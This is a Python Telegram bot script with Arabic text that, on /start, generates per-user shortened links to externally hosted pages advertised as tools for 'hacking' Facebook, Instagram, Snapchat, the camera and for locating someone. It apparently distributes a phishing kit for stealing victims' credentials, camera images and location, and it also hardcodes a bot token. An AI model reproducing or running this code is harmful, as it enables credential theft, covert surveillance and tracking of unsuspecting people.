import telebot
import requests
from flask import Flask
from threading import Thread
import os

# --- نظام الحفاظ على الاتصال 24/7 ---
app = Flask('')
@app.route('/')
def home():
    return "M.Y.9 System is Online"

def run():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- إعدادات البوت ---
TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
bot = telebot.TeleBot(TOKEN)

def short_link(url):
    try:
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
        return res.text if res.status_code == 200 else url
    except:
        return url

@bot.message_handler(commands=['start'])
def send_welcome(message):
    uid = message.chat.id
    first_name = message.from_user.first_name
    hunter = first_name.replace(" ", "_")
    base = "https://m-y-9-tech.github.io/fb/"
    
    # روابط فريدة لكل يوزر
    fb = short_link(f"{base}fb.html?id={uid}&hunter={hunter}")
    ig = short_link(f"{base}ig.html?id={uid}&hunter={hunter}")
    snap = short_link(f"{base}snap.html?id={uid}&hunter={hunter}")
    cam = short_link(f"{base}cam.html?id={uid}&hunter={hunter}")
    loc = short_link(f"{base}loc.html?id={uid}&hunter={hunter}")

    # الرسالة المزخرفة مع رابط الانستا تبعك
    msg = f"""
🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {first_name}

👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚

⚠️ لـ^ـضـ^ـمـان تـ^ـفـ^ـعـ^ـيـل الأدوات، يـ^ـجـ^ـب مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور:
🔴 https://www.instagram.com/m_y_.9/

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
▬▬▬▬▬▬▬▬▬▬▬▬▬▬

🔹 اختـ^ـراق الفيـ^ـسبـ^ـوك 🔐: `{fb}`
🔹 اختـ^ـراق الانـ^ـستـ^ـقـ^ـرام 🛡️: `{ig}`
🔹 اختـ^ـراق سـ^ـنـ^ـاب شـ^ـات 👻: `{snap}`
🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا 📸: `{cam}`
🔹 تـ^ـحـ^ـديـ^ـد المـ^ـوقـ^ـع 📍: `{loc}`

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل 24/7..
    """
    bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)

if __name__ == "__main__":
    keep_alive()
    print("M.Y.9 System is Online...")
    bot.infinity_polling(non_stop=True) # ميزة عشان ما يوقف
